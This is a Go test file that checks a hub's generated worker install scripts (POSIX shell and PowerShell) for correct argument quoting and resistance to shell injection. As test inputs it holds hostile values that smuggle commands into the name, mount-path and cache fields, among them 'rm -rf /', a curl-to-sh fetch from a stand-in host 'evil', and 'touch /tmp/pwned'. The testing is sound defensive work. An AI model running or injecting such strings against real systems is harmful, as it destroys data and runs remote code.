package api

import (
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// An install script that is injection-safe but unrunnable is still broken, and
// quoting bugs produce exactly that: quoting the joined argv instead of each
// argument yields one giant quoted word, which the shell treats as the name of a
// command to execute. `sh -n` catches syntax errors, and the argv assertions
// catch the shape error that stays syntactically valid.
func TestGeneratedPOSIXScriptIsRunnableNotJustSafe(t *testing.T) {
	service := throttleTestService(t, "worker-script-shape.db")
	handler := workerSetupTLSServer(t, service, map[string]string{"linux-amd64": "binary-content"})

	body := `{"platform":"linux-amd64","name":"studio-linux","pairing_token":"pair-abc123","mounts":[{"root_id":"root-1","path":"/mnt/nas/footage"}],"cache_dir":"/var/cache/timingdex"}`
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, tlsAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(body)))
	if response.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
	}
	script := response.Body.String()

	// The enroll invocation must be a command followed by arguments. If the whole
	// line were quoted as one word there would be no unquoted space between the
	// binary and "worker".
	if !strings.Contains(script, `'./timingdex-linux-amd64' 'worker' 'enroll'`) {
		t.Fatalf("enroll line is not a command plus arguments:\n%s", script)
	}
	for _, expected := range []string{`'--pairing' 'pair-abc123'`, `'--mount' 'root-1=/mnt/nas/footage'`, `'--cache' '/var/cache/timingdex'`, `'--name' 'studio-linux'`} {
		if !strings.Contains(script, expected) {
			t.Fatalf("missing %s in:\n%s", expected, script)
		}
	}
	// cache_dir belongs to --cache; folding it into --config used to point the
	// Worker at a config path the operator never asked for.
	if strings.Contains(script, `'--config' '/var/cache`) {
		t.Fatalf("cache_dir must not become the config path:\n%s", script)
	}

	assertPOSIXSyntax(t, script)
}

// The dangerous values must survive as inert text in every position they can
// reach, and the script must still parse afterwards.
func TestGeneratedScriptsNeutraliseShellMetacharacters(t *testing.T) {
	service := throttleTestService(t, "worker-script-injection.db")
	handler := workerSetupTLSServer(t, service, map[string]string{"linux-amd64": "binary-content", "windows-amd64": "binary-content"})

	const evilName = `it's ; rm -rf / #`
	const evilPath = `/mnt/$(curl http://evil/x|sh)/` + "`whoami`"
	const evilCache = `/tmp/'; touch /tmp/pwned; echo '`
	body := `{"platform":"PLATFORM","name":"` + jsonEscape(evilName) + `","pairing_token":"tok","mounts":[{"root_id":"r1","path":"` + jsonEscape(evilPath) + `"}],"cache_dir":"` + jsonEscape(evilCache) + `"}`

	for _, platform := range []string{"linux-amd64", "windows-amd64"} {
		response := httptest.NewRecorder()
		payload := strings.Replace(body, "PLATFORM", platform, 1)
		handler.ServeHTTP(response, tlsAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(payload)))
		if response.Code != http.StatusOK {
			t.Fatalf("%s: status=%d body=%s", platform, response.Code, response.Body.String())
		}
		script := response.Body.String()

		if platform == "linux-amd64" {
			assertPOSIXSyntax(t, script)
			// The POSIX escape for an embedded quote is close/escape/reopen.
			if !strings.Contains(script, `'it'\''s ; rm -rf / #'`) {
				t.Fatalf("embedded quote was not escaped with the close/escape/reopen form:\n%s", script)
			}
			assertArgumentsArriveInert(t, script, evilName, evilPath, evilCache)
			continue
		}
		if !strings.Contains(script, `'it''s ; rm -rf / #'`) {
			t.Fatalf("PowerShell must double the embedded quote:\n%s", script)
		}
		// PowerShell cannot be executed here, so this is the structural guarantee:
		// every dangerous token must sit inside a single-quoted literal, where
		// PowerShell performs no expansion at all. Asserting the tokens are simply
		// absent would be wrong — they are supposed to be present, as inert text.
		for _, token := range []string{"; rm -rf /", "$(curl http://evil/x|sh)", "`whoami`", "touch /tmp/pwned"} {
			if outside := occurrencesOutsideLiteral(script, token); outside > 0 {
				t.Fatalf("PowerShell: %q appears %d time(s) outside a single-quoted literal:\n%s", token, outside, script)
			}
		}
	}
}

// assertArgumentsArriveInert runs the generated enroll line for real, with the
// binary replaced by printf, and checks that each hostile value arrives as one
// literal argument and that nothing executed. Static inspection cannot prove
// this: the payload text is *expected* to appear in the script, and the only
// question is whether the shell treats it as data.
func assertArgumentsArriveInert(t *testing.T, script string, payloads ...string) {
	t.Helper()
	shell, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no POSIX shell available")
	}
	var enroll string
	for _, line := range strings.Split(script, "\n") {
		if strings.Contains(line, "'worker' 'enroll'") {
			enroll = line
			break
		}
	}
	if enroll == "" {
		t.Fatalf("could not find the enroll line in:\n%s", script)
	}
	// Replace only the command word; every argument keeps its original quoting.
	_, arguments, found := strings.Cut(enroll, " ")
	if !found {
		t.Fatalf("enroll line has no arguments: %q", enroll)
	}

	canary := filepath.Join(t.TempDir(), "executed")
	probe := "export CANARY=" + quotePOSIX(canary) + "\nprintf '%s\\n' " + arguments + "\n"
	command := exec.Command(shell, "-s")
	command.Stdin = strings.NewReader(probe)
	out, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("probe failed: %v\n%s", err, out)
	}
	if _, err := os.Stat(canary); err == nil {
		t.Fatalf("the script executed something: canary %s exists", canary)
	}
	printed := strings.Split(strings.TrimRight(string(out), "\n"), "\n")
	for _, payload := range payloads {
		if !slices.Contains(printed, payload) && !containsAsArgument(printed, payload) {
			t.Fatalf("payload %q did not arrive as one literal argument; got %#v", payload, printed)
		}
	}
}

// occurrencesOutsideLiteral counts how many times token appears while the
// PowerShell parser would not be inside a single-quoted literal. Inside such a
// literal PowerShell expands nothing, so that is the property being asserted;
// a doubled quote (”) is an escaped quote and does not end the literal.
func occurrencesOutsideLiteral(script, token string) int {
	inside := make([]bool, len(script))
	literal := false
	for i := 0; i < len(script); i++ {
		if script[i] == '\'' {
			if literal && i+1 < len(script) && script[i+1] == '\'' {
				inside[i], inside[i+1] = true, true
				i++
				continue
			}
			literal = !literal
			inside[i] = true
			continue
		}
		inside[i] = literal
	}
	count := 0
	for offset := 0; ; {
		index := strings.Index(script[offset:], token)
		if index < 0 {
			return count
		}
		at := offset + index
		if !inside[at] {
			count++
		}
		offset = at + 1
	}
}

// containsAsArgument allows for values the generator legitimately prefixes, such
// as a mount rendered as root-id=path.
func containsAsArgument(printed []string, payload string) bool {
	for _, argument := range printed {
		if strings.HasSuffix(argument, payload) {
			return true
		}
	}
	return false
}

// assertPOSIXSyntax parses the script with the real shell. It only checks syntax;
// nothing is executed.
func assertPOSIXSyntax(t *testing.T, script string) {
	t.Helper()
	shell, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no POSIX shell available to parse the generated script")
	}
	command := exec.Command(shell, "-n")
	command.Stdin = strings.NewReader(script)
	if out, err := command.CombinedOutput(); err != nil {
		t.Fatalf("generated script is not valid POSIX shell: %v\n%s\nscript:\n%s", err, out, script)
	}
}

func jsonEscape(s string) string {
	return strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(s)
}
